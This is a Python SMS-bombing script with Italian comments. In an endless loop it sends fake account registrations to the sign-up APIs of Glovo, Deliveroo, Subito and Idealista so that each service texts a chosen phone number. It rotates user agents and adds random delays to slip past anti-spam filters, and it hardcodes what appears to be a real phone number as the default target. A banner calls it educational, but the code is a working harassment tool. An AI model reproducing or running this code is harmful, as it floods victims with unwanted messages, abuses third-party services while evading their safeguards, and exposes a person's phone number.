#!/usr/bin/env python3
import asyncio
import aiohttp
import random
import sys
from colorama import Fore, Style, init

init(autoreset=True)

BANNER = f"""
{Fore.RED}███████╗███╗   ███╗███████╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ 
{Fore.RED}██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗
{Fore.WHITE}███████╗██╔████╔██║███████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝
{Fore.WHITE}╚════██║██║╚██╔╝██║╚════██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗
{Fore.RED}███████║██║ ╚═╝ ██║███████║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║
{Fore.RED}╚══════╝╚═╝     ╚═╝╚══════╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
{Fore.YELLOW}             [ SOLO PER TEST DI STRESS E SCOPI EDUCATIVI ]
"""

class SMSBomber:
    def __init__(self, target):
        self.target = target # Formato: 393738513104
        self.success = 0
        self.failed = 0
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.143 Mobile Safari/537.36"
        ]

    async def provider_glovo(self, session):
        url = "https://glovoapp.com/api/v2/oauth/register"
        payload = {"phone": "+" + self.target, "name": "Andrea", "email": f"test{random.randint(1,9999)}@gmail.com"}
        headers = {"User-Agent": random.choice(self.user_agents)}
        try:
            async with session.post(url, json=payload, headers=headers, timeout=5) as resp:
                if resp.status in [200, 201, 400]: self.success += 1 # 400 spesso significa che l'SMS è stato inviato ma l'invio è duplicato
                else: self.failed += 1
        except: self.failed += 1

    async def provider_deliveroo(self, session):
        url = "https://deliveroo.it/api/v2/users"
        payload = {"mobile": "+" + self.target, "password": "Password123!", "first_name": "Test", "last_name": "User"}
        headers = {"User-Agent": random.choice(self.user_agents)}
        try:
            async with session.post(url, json=payload, headers=headers, timeout=5) as resp:
                if resp.status in [200, 201, 422]: self.success += 1
                else: self.failed += 1
        except: self.failed += 1

    async def provider_subito(self, session):
        url = "https://www.subito.it/api/v1/auth/register"
        payload = {"phone": self.target}
        headers = {"User-Agent": random.choice(self.user_agents)}
        try:
            async with session.post(url, json=payload, headers=headers, timeout=5) as resp:
                if resp.status in [200, 201]: self.success += 1
                else: self.failed += 1
        except: self.failed += 1

    async def provider_idealista(self, session):
        url = "https://www.idealista.it/ajax/user/register.json"
        payload = {"phone": self.target, "type": "PRIVATE"}
        headers = {"User-Agent": random.choice(self.user_agents)}
        try:
            async with session.post(url, data=payload, headers=headers, timeout=5) as resp:
                if resp.status in [200, 201]: self.success += 1
                else: self.failed += 1
        except: self.failed += 1

    async def attack(self):
        print(f"{Fore.CYAN}[*] Avvio attacco su: {Fore.YELLOW}{self.target}")
        print(f"{Fore.WHITE}[!] Premi Ctrl+C per fermare l'attacco.")
        async with aiohttp.ClientSession() as session:
            while True:
                tasks = [
                    self.provider_glovo(session),
                    self.provider_deliveroo(session),
                    self.provider_subito(session),
                    self.provider_idealista(session)
                ]
                await asyncio.gather(*tasks)
                print(f"{Fore.GREEN}[+] Successi: {self.success} | {Fore.RED}[-] Falliti: {self.failed}", end="\r")
                await asyncio.sleep(random.uniform(1.5, 3.0)) # Delay casuale per evitare filtri anti-spam troppo aggressivi

async def main():
    print(BANNER)
    # Impostiamo il tuo numero come default se non viene passato nulla
    target = "393738513104" 
    
    if len(sys.argv) >= 2:
        target = sys.argv[1].replace("+", "")

    bomber = SMSBomber(target)
    try:
        await bomber.attack()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Attacco terminato. Totale inviati: {bomber.success}")

if __name__ == "__main__":
    asyncio.run(main())
